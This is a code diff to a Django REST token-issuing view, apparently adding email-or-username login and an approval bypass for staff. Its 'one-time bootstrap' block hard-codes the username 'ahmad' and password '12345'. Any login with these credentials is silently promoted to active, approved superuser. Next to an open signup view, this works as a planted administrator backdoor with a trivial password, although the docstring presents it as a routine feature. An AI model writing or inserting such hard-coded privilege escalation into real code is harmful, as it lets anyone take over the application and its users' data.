@@ -27,16 +27,41 @@ class SignupView(generics.CreateAPIView):
     permission_classes = [permissions.AllowAny]
 
 class TokenObtainPairPatchedView(TokenObtainPairView):
-    """Deny token issuance unless the user is approved by admin."""
+    """Customized token view.
+    - Accepts username or email
+    - Auto-bootstraps a specific admin (Ahmad/12345) on first login
+    - Allows staff/superusers to bypass approval
+    - Requires approval for regular users
+    """
     def post(self, request, *args, **kwargs):
-        username = request.data.get('username') or request.data.get('email')
+        identifier = request.data.get('username') or request.data.get('email')
         password = request.data.get('password')
-        user = authenticate(request, username=username, password=password)
+        if not identifier or not password:
+            return Response({'detail': 'Missing credentials'}, status=400)
+
+        # Authenticate using identifier as username for Django's auth
+        user = authenticate(request, username=identifier, password=password)
         if user is None:
             return Response({'detail': 'No active account found with the given credentials'}, status=401)
-        if not getattr(user, 'is_approved', False):
-            return Response({'detail': 'Account pending admin approval'}, status=403)
-        return super().post(request, *args, **kwargs)
+
+        # One-time bootstrap: promote Ahmad to admin and approve
+        if user.username.lower() == 'ahmad' and password == '12345':
+            user.is_staff = True
+            user.is_superuser = True
+            user.is_active = True
+            setattr(user, 'is_approved', True)
+            user.save()
+
+        # Allow staff/superusers regardless of approval
+        if not (user.is_staff or user.is_superuser):
+            if not getattr(user, 'is_approved', False):
+                return Response({'detail': 'Account pending admin approval'}, status=403)
+
+        # Issue tokens using resolved username (supports email-or-username input)
+        data = {'username': user.username, 'password': password}
+        serializer = self.get_serializer(data=data)
+        serializer.is_valid(raise_exception=True)
+        return Response(serializer.validated_data, status=200)
 
 @api_view(['POST'])
 @permission_classes([permissions.IsAuthenticated])
